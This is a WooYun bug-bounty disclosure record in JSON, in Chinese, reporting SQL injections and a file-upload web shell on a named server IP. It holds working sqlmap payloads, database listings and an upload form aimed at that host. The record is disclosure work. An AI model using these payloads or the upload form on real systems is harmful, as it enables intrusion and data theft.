{"id": 25288, "wybug_id": "wooyun-2015-0132002", "wybug_title": "天天果园某分站存在多处SQL注入，且可任意上传导致GetShell （二）", "wybug_corp": "fruitday.com", "wybug_author": "浮萍", "wybug_date": "2015-08-06 10:10", "wybug_open_date": "2015-08-10 19:13", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 另外一个至少三处SQL 注入任意上传 详细说明：  可以参考http://wooyun.org/bugs/wooyun-2010-0130601http://210.14.78.115/\n\n通过查看代码可以知道这还是泛微的系统。。。构造注入点：首先看第一处:http://210.14.78.115/page/maint/login/Page.jsp?templateId=8&logintype=1&gopage=&message=55\nGET parameter 'templateId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 60 HTTP(s) requests:---Parameter: templateId (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: templateId=8 AND 4607=4607&logintype=1&gopage=&message=55    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: templateId=8 WAITFOR DELAY '0:0:5'&logintype=1&gopage=&message=55---\n\nweb application technology: JSPback-end DBMS: Microsoft SQL Server 2008\n 数据库\navailable databases [8]:[*] master[*] model[*] msdb[*] oa[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] TUOYISZWL\n\ncurrent database:    'oa'current user:    'sa'\n看oa中的表一千多个 就不细看了\n\n\nDatabase: TUOYISZWL[18 tables]+----------------+| TuoYi_Admin    || TuoYi_Content  || TuoYi_File     || TuoYi_HR       || TuoYi_IndexPic || TuoYi_Limits   || TuoYi_Link     || TuoYi_Log      || TuoYi_News     || TuoYi_NewsType || TuoYi_Other    || TuoYi_OtherPic || TuoYi_OtherPro || TuoYi_PinPai   || TuoYi_ProPic   || TuoYi_Project  || TuoYi_QuYu     || TuoYi_TopPic   |+----------------+\n   漏洞证明：  第二处\nhttp://210.14.78.115/weaver/weaver.email.FileDownloadLocation?fileid=39*&download=1\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #1* (URI)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: http://210.14.78.115:80/weaver/weaver.email.FileDownloadLocation?fileid=39;WAITFOR DELAY '0:0:5'--&download=1---\n数据库\navailable databases [8]:[*] master[*] model[*] msdb[*] oa[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] TUOYISZWL\n第三处：\nhttp://210.14.78.115//homepage/LoginHomepage.jsp?hpid=52*&isfromportal=1\n\nURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 115 HTTP(s) requests:---Parameter: #1* (URI)    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: http://210.14.78.115:80//homepage/LoginHomepage.jsp?hpid=52 WAITFOR DELAY '0:0:5'&isfromportal=1---\n四任意文件上传getshell构造表单\n<form method='post' action='http://210.14.78.115/tools/SWFUpload/upload.jsp'  enctype=\"multipart/form-data\" > <input type=\"file\" id=\"file\" name=\"test\" style=\"height:20px;BORDER: #8F908B 1px solid;\"/><button type=submit value=\"getshell\">getshell</button> </form>\n\n\n访问http://210.14.78.115/null1.jsp\n\n   修复方案：  注意排查   版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-08-10 19:13 厂商回复： 该ip不是公司ip 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-10 20:57 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  @天天果园请看http://wooyun.org/bugs/wooyun-2010-0109859和wooyun.org/bugs/wooyun-2010-0132002这里面说的ip就是http://210.14.78.115/而且http://www.sgs.gov.cn/lz/licenseLink.do?method=licenceView&entyId=20110905115039455也有说明    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}